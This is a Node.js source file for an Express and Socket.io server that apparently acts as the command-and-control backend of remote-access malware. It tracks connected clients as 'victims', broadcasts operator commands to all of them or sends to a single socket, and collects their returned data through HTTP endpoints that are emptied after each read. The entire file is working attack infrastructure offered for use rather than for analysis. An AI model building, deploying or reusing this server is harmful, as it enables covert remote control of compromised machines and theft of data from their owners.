const express = require("express")
const app = express()
const cors = require("cors")
const socket = require("socket.io")
const USER = require("./api/module/user")
const db = require("./api/config/dbconnect")
const init_router = require("./api/router/index")

require("dotenv").config()
const PORT = 5678
app.use(cors())
app.use(express.json())
const all_data = []
app.use("/command/data", (req, res) => {
  try {
    res.status(200).json({
      success: true,
      data: all_data
    })
    while (all_data.length > 0) {
      all_data.pop()
    }
    return 1
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "error from server"
    })
  }
})

const all_data_only = []

app.use("/data/only", (req, res) => {
  try {
    res.status(200).json({
      success: true,
      data: all_data_only
    })
    while (all_data_only.length > 0) {
      all_data_only.pop()
    }
    return 1
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "error from server"
    })
  }
})

const server = app.listen(PORT, () => {
  console.log(`server is running ${PORT}`)
})

const io = socket(server, {
  cors: {
    origin: "*",
    credentials: true,
    methods: ["GET", "PUT", 'PATCH', 'DELETE', 'POST']
  }
})

const getFormattedDate = () => {
  const now = new Date();

  const day = now.getDate();
  const month = now.getMonth() + 1; // Months are 0-indexed, so add 1
  const year = now.getFullYear();
  const hours = now.getHours();
  const minutes = now.getMinutes();
  const seconds = now.getSeconds();

  // Format the date in Vietnamese language
  const formattedDate = `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;

  return formattedDate;
}

let list_victim = [
]

io.on("connection", (socket) => {
  console.log("user connected")
  list_victim.push({
    id: socket.id,
    date: getFormattedDate()
  })
  socket.broadcast.emit("victimConnectToServer", { data: list_victim })
  socket.on("command", (data) => {
    socket.broadcast.emit("server_send_command", data)
  })
  // socket.on("information", async (data) => {
  //   list_victim.push({
  //     id: socket.id,
  //     date: getFormattedDate()
  //   })
  //   socket.broadcast.emit("victimConnectToServer", { data: list_victim })
  // })
  socket.on("send_data_all_user", (data) => {
    all_data.push(data)
  })


  socket.on("send_to_only", (data) => {
    try {
      socket.to(data.id).emit("server_send_to_only_you", data.cmd)
    } catch {
      console.log("err")
    }
  })

  socket.on("only_to_all", (data) => {
    try {
      all_data_only.push(data)
    } catch (err) {
      console.log(err)
    }
  })

  socket.on("disconnect", async () => {
    console.log("user ip disconnected" + socket.id)
    list_victim = list_victim.filter(item => item.id !== socket.id);
    socket.broadcast.emit("victimConnectToServer", { data: list_victim })
  })
})
